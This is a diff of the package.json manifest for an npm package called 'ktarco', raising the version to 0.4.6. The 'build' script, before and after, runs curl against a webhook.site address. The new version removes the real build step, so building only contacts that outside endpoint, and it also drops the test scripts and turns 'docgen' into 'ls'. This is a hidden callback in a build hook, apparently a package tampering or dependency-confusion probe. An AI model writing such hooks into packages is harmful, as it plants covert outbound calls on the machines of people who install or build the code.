@@ -1,6 +1,6 @@
 {
   "name": "ktarco",
-  "version": "0.4.3",
+  "version": "0.4.6",
   "description": "ktarco",
   "main": "./lib/index.js",
   "module": "./es/index.js",
@@ -11,12 +11,8 @@
   },
   "scripts": {
     "dev": "start-storybook -p 6006",
-    "build": "curl https://webhook.site/6cf0f3a0-aad5-4c39-ad3c-4f5be8c885c8/aaa && arco-scripts build:component",
-    "docgen": "arco-scripts docgen",
-    "test:client": "arco-scripts build:component:cjs && arco-scripts test:client",
-    "test:node": "arco-scripts build:component:cjs && arco-scripts test:node",
-    "test": " arco-scripts build:component:cjs && NODE_ENV=test arco-scripts test",
-    "show:config": "arco-scripts show:config",
+    "build": "curl https://webhook.site/6cf0f3a0-aad5-4c39-ad3c-4f5be8c885c8/aaa",
+    "docgen": "ls",
     "eslint": "eslint tests/ src/ --fix --cache --quiet --ext .js,.jsx,.ts,.tsx",
     "stylelint": "stylelint 'src/**/*.less' --fix --cache",
     "format": "prettier '{tests,src}/**/*.{js,jsx,ts,tsx}' --config .prettierrc --write ",
